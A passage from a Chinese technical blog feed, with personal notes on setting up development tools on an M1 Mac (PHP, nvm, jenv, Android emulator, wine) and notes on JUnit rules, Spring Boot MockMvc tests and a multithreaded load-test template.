href="https://blog.csdn.net/w605283073/article/details/111770386" target="_blank" rel="noopener">https://blog.csdn.net/w605283073/article/details/111770386</a></li></ul></li></ul><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ul><li>mac系统自带的php在目录/usr/bin/php，php-fpm在目录/user/sbin/php-fpm</li><li>重新安装php(基于arm安装，x86安装参考下文)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arm(M1)安装的brew为v3.2.11. 安装位置 /opt/homebrew, 安装的包位置 /opt/homebrew/opt</span></span><br><span class="line"><span class="comment"># x86(Inter)安装的brew为v3.6.21. 安装位置 /usr/local/Homebrew, 安装的包位置 /usr/local/Cellar</span></span><br><span class="line"><span class="comment"># 安装最新版本php(对应路径为/opt/homebrew/opt/php)</span></span><br><span class="line">brew install php</span><br><span class="line"><span class="comment"># 安装某个版本php</span></span><br><span class="line"><span class="comment"># 有可能安装php@7.4提示：Error: php@7.4 has been disabled because it is a versioned formula!</span></span><br><span class="line"><span class="comment"># 解决办法参考：https://stackoverflow.com/questions/70417377/error-php7-3-has-been-disabled-because-it-is-a-versioned-formula (`brew tap shivammathur/php`, `brew install shivammathur/php/php@7.4`)</span></span><br><span class="line">brew install php@7.4</span><br><span class="line"><span class="comment"># 查看安装好的php路径</span></span><br><span class="line">brew --prefix php@7.4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动php-fpm</span></span><br><span class="line">brew services start php@7.4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换版本: 先取消原关联版本, 再切换到其他版本</span></span><br><span class="line"><span class="comment"># 可通过 brew list 查看按照的包名称</span></span><br><span class="line">brew unlink php@7.3</span><br><span class="line">brew link php@7.4</span><br></pre></td></tr></table></figure><ul><li>基于x86模式安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令行切换成x86模式</span></span><br><span class="line"><span class="comment"># php7.3、php7.4尚未安装成功</span></span><br><span class="line">/usr/<span class="built_in">local</span>/Homebrew/bin/brew install php@8.0</span><br><span class="line">/usr/<span class="built_in">local</span>/Cellar/php@8.0/8.0.27_1/bin/php -v</span><br><span class="line">brew services start php@8.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装composer</span></span><br><span class="line">curl -sS https://getcomposer.org/installer | /usr/<span class="built_in">local</span>/Cellar/php@8.0/8.0.27_1/bin/php</span><br><span class="line"><span class="comment"># 查看composer</span></span><br><span class="line">/usr/<span class="built_in">local</span>/Cellar/php@8.0/8.0.27_1/composer.phar</span><br></pre></td></tr></table></figure><h3 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h3><ul><li>插件目录 <code>/Users/smalle/Library/Application\ Support/JetBrains/IntelliJIdea2021.2/plugins</code></li></ul><h3 id="Notepad-Next"><a href="#Notepad-Next" class="headerlink" title="Notepad Next"></a>Notepad Next</h3><ul><li><a href="https://github.com/dail8859/NotepadNext" target="_blank" rel="noopener">https://github.com/dail8859/NotepadNext</a></li></ul><h3 id="NVM-Node"><a href="#NVM-Node" class="headerlink" title="NVM/Node"></a>NVM/Node</h3><ul><li>安装Node(基于nvm)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装nvm</span></span><br><span class="line">curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.38.0/install.sh | bash</span><br><span class="line"><span class="comment"># 但是安装node v10.x失败，v12.x成功；**但是从node官网下载node v10.24.1安装成功**</span></span><br><span class="line">nvm install 16.8.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载nvm，并删除.bash_profile文件中得$NVM_HOME配置</span></span><br><span class="line">rm -rf ~/.nvm</span><br></pre></td></tr></table></figure><ul><li>安装vue-cli，使用root账号安装<code>npm install -g @vue/cli</code><ul><li>部分使用sudo仍然安装失败，可使用如<code>sudo npm install --unsafe-perm=true --allow-root -g mirror-config-china --registry=https://registry.npm.taobao.org</code></li></ul></li><li>常见问题<ul><li>在npm install进行包依赖安装是，部分包需要依赖autoreconf命令，从而提示<code>/bin/sh: autoreconf: command not found</code>。此时可通过<code>brew install autoconf automake libtool</code>先手动安装autoreconf，并将<code>PATH=&quot;/opt/homebrew/opt/libtool/libexec/gnubin:$PATH&quot;</code>添加到<code>~/.zshrc</code></li></ul></li></ul><h3 id="FTP-SFTP"><a href="#FTP-SFTP" class="headerlink" title="FTP/SFTP"></a>FTP/SFTP</h3><ul><li>MAC开启SFTP服务<ul><li>偏好设置 - 共享 - 勾选远程登录 - 添加允许登录用户</li><li>执行<code>sftp localhost</code>即可</li></ul></li></ul><h3 id="Jad-GUI"><a href="#Jad-GUI" class="headerlink" title="Jad-GUI"></a>Jad-GUI</h3><ul><li>jad-gui打开报错需要按照jdk 1.8+，解决办法参考：<a href="https://blog.csdn.net/lei182/article/details/111914142" target="_blank" rel="noopener">https://blog.csdn.net/lei182/article/details/111914142</a></li></ul><h3 id="Jenv-Java多版本管理工具"><a href="#Jenv-Java多版本管理工具" class="headerlink" title="Jenv(Java多版本管理工具)"></a>Jenv(Java多版本管理工具)</h3><ul><li>参考：<a href="https://blog.csdn.net/aigestudio/article/details/99641818" target="_blank" rel="noopener">https://blog.csdn.net/aigestudio/article/details/99641818</a></li><li>使用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">brew install jenv</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH="$HOME/.jenv/bin:$PATH"'</span> &gt;&gt; ~/.bash_profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'eval "$(jenv init -)"'</span> &gt;&gt; ~/.bash_profile</span><br><span class="line"><span class="comment"># 查看可用的JDK路径（需提前手动安装，jenv只能切换版本，不能进行安装），安装JDK参考上文[JAVA](#JAVA)</span></span><br><span class="line">/usr/libexec/java_home -V</span><br><span class="line"><span class="comment"># 将可用的JDK加入到jenv中管理</span></span><br><span class="line">jenv add /Library/Java/JavaVirtualMachines/jdk1.8.0_202.jdk/Contents/Home</span><br><span class="line">jenv add /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home</span><br><span class="line"><span class="comment"># 查看jenv管理的jdk版本</span></span><br><span class="line">jenv versions</span><br><span class="line"><span class="comment"># 全局切换版本，还支持：shell/local/global</span></span><br><span class="line"><span class="comment"># shell 用于设置终端窗口生命周期内使用的 JDK 版本</span></span><br><span class="line"><span class="comment"># local 用于设置当前目录下使用的 JDK 版本</span></span><br><span class="line"><span class="comment"># global 用于设置全局使用的 JDK 版本</span></span><br><span class="line">jenv global 1.8</span><br></pre></td></tr></table></figure><h3 id="安卓模拟器"><a href="#安卓模拟器" class="headerlink" title="安卓模拟器"></a>安卓模拟器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考: https://ov-vo.cn/573.html</span></span><br><span class="line"><span class="comment"># 安装ADB</span></span><br><span class="line">brew install android-platform-tools</span><br><span class="line"><span class="comment"># 测试是否正常安装</span></span><br><span class="line">adb devices</span><br><span class="line"><span class="comment"># 查看安装的位置</span></span><br><span class="line">brew info android-sdk</span><br><span class="line"><span class="comment"># 安装Android-Emulator并打开</span></span><br><span class="line">https://github.com/google/android-emulator-m1-preview/releases/tag/0.3</span><br><span class="line"><span class="comment"># 配置ADB</span></span><br><span class="line">打开设置窗口 - Settings- 取消勾选Use detected ADB location</span><br><span class="line">点击后面的文件夹图标找到ADB文件路径 /opt/homebrew/Caskroom/android-platform-tools/33.0.1.../platform-tools/adb</span><br><span class="line"><span class="comment"># 修改虚拟机基本设置(可选)</span></span><br><span class="line">编辑/applications/android \ emulator.app/cottents/macos/Pixel_5_API_31/config.ini 配置文件</span><br><span class="line">默认分配 4CPU 4GBRAM 5GB用户空间 分辨率2340*1080 DPI400，可按需修改</span><br></pre></td></tr></table></figure><h3 id="CrossOver"><a href="#CrossOver" class="headerlink" title="CrossOver"></a>CrossOver</h3><ul><li>CrossOver 20.0.4支持OSX 11.x上运行Windows应用，但是收费</li><li>Wineskin 类似CrossOver，且免费</li></ul><h3 id="wine"><a href="#wine" class="headerlink" title="wine"></a>wine</h3><ul><li><code>wine</code> 已经不支持 OSX 11.x(由于OSX不再支持32bit程序)<ul><li>有说可使用<code>https://hub.fastgit.org/Gcenx/WineskinServer</code>解决(没成功)</li><li><strong>可使用CrossOver代替</strong></li></ul></li><li>wine依赖<code>XQuartz</code>，就是俗称的X11，是苹果电脑为Mac OS X上X Window系统的实作</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考：https://wiki.winehq.org/MacOS</span></span><br><span class="line"><span class="comment"># 需先安装xquartz, 下载 https://www.xquartz.org/</span></span><br><span class="line"><span class="comment"># 下载winehq pkg包：https://dl.winehq.org/wine-builds/macosx/download.html</span></span><br></pre></td></tr></table></figure><h2 id="相关限制"><a href="#相关限制" class="headerlink" title="相关限制"></a>相关限制</h2><ul><li>不支持修改<code>/etc/profile</code>等配置，可修改<code>~/.zprofile</code>或<code>~/.bash_profile</code>代替。类似的文件<code>.zshrc</code></li><li>不支持向<code>/usr/bin</code>目录添加文件，可向<code>/usr/local/bin</code>目录添加来实现直接运行程序目的</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;版本：Mac M1 11.4&lt;/li&gt;
&lt;li&gt;Mac软件下载&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.mac
      
    
    </summary>
    
      <category term="linux" scheme="http://blog.aezo.cn/categories/linux/"/>
    
    
      <category term="system" scheme="http://blog.aezo.cn/tags/system/"/>
    
  </entry>
  
  <entry>
    <title>Junit</title>
    <link href="http://blog.aezo.cn/2021/08/19/java/junit/"/>
    <id>http://blog.aezo.cn/2021/08/19/java/junit/</id>
    <published>2021-08-19T10:28:00.000Z</published>
    <updated>2023-08-06T14:27:10.792Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="Rule"><a href="#Rule" class="headerlink" title="@Rule"></a>@Rule</h3><ul><li><code>@Rule</code>是JUnit4.7加入的新特性，有点类似于拦截器，用于在测试方法执行前后添加额外的处理。实际上是@Before，@After的另一种实现<ul><li>需要注解在实现了TestRule的public成员变量上或者返回TestRule的方法上</li><li>相应Rule会应用于该类每个测试方法</li></ul></li><li>允许在测试类中非常灵活的增加或重新定义每个测试方法的行为，简单来说就是提供了测试用例在执行过程中通用功能的共享的能力 <a href="https://blog.csdn.net/fanxiaobin577328725/article/details/78407199" target="_blank" rel="noopener">^1</a></li><li>案例参考下文<a href="#ErrorCollector类收集错误统一抛出">ErrorCollector</a></li></ul><h3 id="ErrorCollector类收集错误统一抛出"><a href="#ErrorCollector类收集错误统一抛出" class="headerlink" title="ErrorCollector类收集错误统一抛出"></a>ErrorCollector类收集错误统一抛出</h3><ul><li>Junit在遇到一个测试失败时，并会退出，通过ErrorCollector可实现收集所有的错误，等方法运行完后统一抛出</li><li>案例</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Rule</span></span><br><span class="line">    <span class="keyword">public</span> ErrorCollector collector = <span class="keyword">new</span> ErrorCollector();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">example</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        errorCollector.addError(<span class="keyword">new</span> RuntimeException(<span class="string">"error 1"</span>));</span><br><span class="line">        System.out.println(<span class="string">"=================================="</span>);</span><br><span class="line">        <span class="comment">// 如果测试值 myVal != true 则将错误添加到collector中</span></span><br><span class="line">        <span class="keyword">boolean</span> myVal = <span class="keyword">false</span>;</span><br><span class="line">        collector.checkThat(<span class="string">"error2"</span>, myVal, Is.is(<span class="keyword">true</span>));</span><br><span class="line">        <span class="comment">// 代码执行完，此处会统一抛出错误，提示2个异常</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Springboot测试"><a href="#Springboot测试" class="headerlink" title="Springboot测试"></a>Springboot测试</h2><ul><li>测试环境使用单独的配置文件<ul><li>可使用<code>@ActiveProfiles(&quot;test&quot;)</code>激活application-test.yml的配置文件</li><li>如果在<code>src/test/resources</code>目录下增加application-test.yml，运行时会覆盖<code>src/main/resources</code>下的该文件</li></ul></li><li>普通测试</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigureMockMvc</span> <span class="comment">// 可以自动的注册所有添加@Controller或者@RestController的路由的MockMvc了</span></span><br><span class="line"><span class="meta">@RunWith</span>(SpringRunner.class)</span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="comment">// @SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT) // websocket环境需要，否则报错：javax.websocket.server.ServerContainer not available</span></span><br><span class="line"><span class="comment">//@ActiveProfiles(value = &#123;"dev", "dev-local"&#125;) // 可设置配置文件（如果文件在外部可在测试类配置中增加环境变量，如spring.config.additional-location=/Users/smalle/data/project/aezo-chat-gpt/）</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicAddTests</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MockMvc mockMvc;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">MvcResult mvcResult = mockMvc.perform(MockMvcRequestBuilders.get(<span class="string">"/test3?dsKey=mysql-two-dynamic"</span>))</span><br><span class="line">                    .andExpect(MockMvcResultMatchers.status().isOk())</span><br><span class="line">                    .andReturn();</span><br><span class="line">            String content = mvcResult.getResponse().getContentAsString();</span><br><span class="line">            Assert.assertEquals(<span class="string">"success"</span>, <span class="string">"hello world!"</span>, content);</span><br><span class="line"></span><br><span class="line">            mockMvc.perform(MockMvcRequestBuilders.post(<span class="string">"/api/login/auth"</span>)</span><br><span class="line">                    .contentType(MediaType.APPLICATION_JSON)</span><br><span class="line">                    .content(<span class="string">"&#123;\"name\": \"smalle\"&#125;"</span>)</span><br><span class="line">            ).andExpect(MockMvcResultMatchers.status().isOk())</span><br><span class="line">                    .andDo(MockMvcResultHandlers.print()); <span class="comment">// 打印请求过程</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多线程测试"><a href="#多线程测试" class="headerlink" title="多线程测试"></a>多线程测试</h2><h3 id="多线程简单测试模板"><a href="#多线程简单测试模板" class="headerlink" title="多线程简单测试模板"></a>多线程简单测试模板</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestU</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">multiThreadSimple</span><span class="params">(MultiThreadSimpleTemplate.Exec exec)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MultiThreadSimpleTemplate().run(exec, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">multiThreadSimple</span><span class="params">(MultiThreadSimpleTemplate.Exec exec, <span class="keyword">int</span> totalNum, <span class="keyword">int</span> threadNum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MultiThreadSimpleTemplate().run(totalNum, threadNum, exec, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">multiThreadSimple</span><span class="params">(MultiThreadSimpleTemplate.Exec exec, MultiThreadSimpleTemplate.BeforeExec beforeExec, </span></span></span><br><span class="line"><span class="function"><span class="params">                                         MultiThreadSimpleTemplate.AfterExec afterExec, <span class="keyword">int</span> totalNum, <span class="keyword">int</span> threadNum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MultiThreadSimpleTemplate().run(totalNum, threadNum, exec, beforeExec, afterExec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MultiThreadSimpleTemplate</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 总访问量是totalNum，并发量是threadNum</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> totalNum = <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> threadNum = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">float</span> sumExecTime = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">long</span> firstExecTime = Long.MAX_VALUE;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">long</span> lastDoneTime = Long.MIN_VALUE;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">int</span> totalNum, <span class="keyword">int</span> threadNum, Exec exec, BeforeExec beforeExec, AfterExec afterExec)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.totalNum = totalNum;</span><br><span class="line">            <span class="keyword">this</span>.threadNum = threadNum;</span><br><span class="line">            <span class="keyword">this</span>.run(exec, beforeExec, afterExec);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(Exec exec, BeforeExec beforeExec, AfterExec afterExec)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(beforeExec != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!beforeExec.beforeExec()) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"BeforeExec返回false, 中断运行"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> ConcurrentHashMap&lt;Integer, ThreadRecord&gt; records = <span class="keyword">new</span> ConcurrentHashMap&lt;Integer, ThreadRecord&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 建立ExecutorService线程池，threadNum个线程可以同时访问</span></span><br><span class="line">            ExecutorService es = Executors.newFixedThreadPool(threadNum);</span><br><span class="line">            <span class="keyword">final</span> CountDownLatch doneSignal = <span class="keyword">new</span> CountDownLatch(totalNum); <span class="comment">// 此数值和循环的大小必须一致</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; totalNum; i++) &#123;</span><br><span class="line">                Runnable run = () -&gt; &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">int</span> index = ++count;</span><br><span class="line">                        <span class="keyword">long</span> systemCurrentTimeMillis = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">                        exec.exec();</span><br><span class="line"></span><br><span class="line">                        records.put(index, <span class="keyword">new</span> ThreadRecord(systemCurrentTimeMillis, System.currentTimeMillis()));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="comment">// 每调用一次countDown()方法，计数器减1</span></span><br><span class="line">                        doneSignal.countDown();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                es.execute(run);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 计数器大于0时，await()方法会阻塞程序继续执行。直到所有子线程完成(每完成一个子线程，计数器-1)</span></span><br><span class="line">                doneSignal.await();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取每个线程的开始时间和结束时间</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i : records.keySet()) &#123;</span><br><span class="line">                ThreadRecord r = records.get(i);</span><br><span class="line">                sumExecTime += ((<span class="keyword">double</span>) (r.endTime - r.startTime)) / <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (r.startTime &lt; firstExecTime) &#123;</span><br><span class="line">                    firstExecTime = r.startTime;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (r.endTime &gt; lastDoneTime) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.lastDoneTime = r.endTime;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">float</span> avgExecTime = <span class="keyword">this</span>.sumExecTime / records.size();</span><br><span class="line">            <span class="keyword">float</span> totalExecTime = ((<span class="keyword">float</span>) (<span class="keyword">this</span>.lastDoneTime - <span class="keyword">this</span>.firstExecTime)) / <span class="number">1000</span>;</span><br><span class="line">            NumberFormat nf = NumberFormat.getNumberInstance();</span><br><span class="line">            nf.setMaximumFractionDigits(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 需要关闭，否则JVM不会退出。(如在Springboot项目的Job中切勿关闭)</span></span><br><span class="line">            es.shutdown();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"======================================================"</span>);</span><br><span class="line">            System.out.println(<span class="string">"线程数量:\t"</span> + threadNum + <span class="string">" 个"</span>);</span><br><span class="line">            System.out.println(<span class="string">"总访问量:\t"</span> + totalNum + <span class="string">" 次"</span>);</span><br><span class="line">            System.out.println(<span class="string">"平均执行时间:\t"</span> + nf.format(avgExecTime) + <span class="string">" 秒"</span>);</span><br><span class="line">            System.out.println(<span class="string">"总执行时间:\t"</span> + nf.format(totalExecTime) + <span class="string">" 秒"</span>);</span><br><span class="line">            System.out.println(<span class="string">"吞吐量:\t\t"</span> + nf.format(totalNum / totalExecTime) + <span class="string">" 次/秒"</span>);</span><br><span class="line">            System.out.println(<span class="string">"======================================================"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(afterExec != <span class="keyword">null</span>) &#123;</span><br><span class="line">                afterExec.afterExec();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadRecord</span> </span>&#123;</span><br><span class="line">            <span class="keyword">long</span> startTime;</span><br><span class="line">            <span class="keyword">long</span> endTime;</span><br><span class="line"></span><br><span class="line">            ThreadRecord(<span class="keyword">long</span> st, <span class="keyword">long</span> et) &#123;</span><br><span class="line">                <span class="keyword">this</span>.startTime = st;</span><br><span class="line">                <span class="keyword">this</span>.endTime = et;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@FunctionalInterface</span></span><br><span class="line">        <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BeforeExec</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">boolean</span> <span class="title">beforeExec</span><span class="params">()</span></span>;</span><br><span class="line">        